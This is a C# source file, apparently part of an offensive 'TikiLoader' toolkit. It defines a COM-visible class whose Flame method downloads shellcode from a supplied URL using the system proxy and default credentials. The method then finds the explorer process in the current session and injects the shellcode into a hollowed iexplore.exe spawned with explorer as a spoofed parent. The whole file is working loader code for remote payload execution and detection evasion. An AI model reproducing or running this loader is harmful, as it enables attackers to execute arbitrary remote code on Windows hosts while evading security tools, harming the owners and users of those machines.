﻿using System;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using TikiLoader;

[ComVisible(true)]
public class TikiSpawn
{

    public TikiSpawn()
    {
        //Flame(@"", @"");
    }

    private static byte[] GetShellcode(string url)
    {
        WebClient client = new WebClient();
        client.Proxy = WebRequest.GetSystemWebProxy();
        client.Proxy.Credentials = CredentialCache.DefaultCredentials;
        byte[] compressedEncodedShellcode = client.DownloadData(url);
        /*return Loader.DecompressShellcode(Convert.FromBase64String(compressedEncodedShellcode));*/
        return compressedEncodedShellcode;
    }

    private static int FindProcessPid(string process)
    {
        int pid = 0;
        int session = Process.GetCurrentProcess().SessionId;
        Process[] processes = Process.GetProcessesByName(process);

        foreach (Process proc in processes)
        {
            if (proc.SessionId == session)
            {
                pid = proc.Id;
            }
        }

        return pid;
    }

    public static void Flame(string url)
    {
        string binary = @"c:\Program Files\Internet Explorer\iexplore.exe";
        byte[] shellcode = GetShellcode(url);
        int ppid = FindProcessPid("explorer");

        if (ppid == 0)
        {
            Console.WriteLine("[x] Couldn't get Explorer PID");
            Environment.Exit(1);
        }

        try
        {
            var hollower = new Hollower();
            hollower.Hollow(binary, shellcode, ppid);
        }
        catch (Exception e)
        {
            Console.WriteLine("[x] Something went wrong! " + e.Message);
        }
    }
}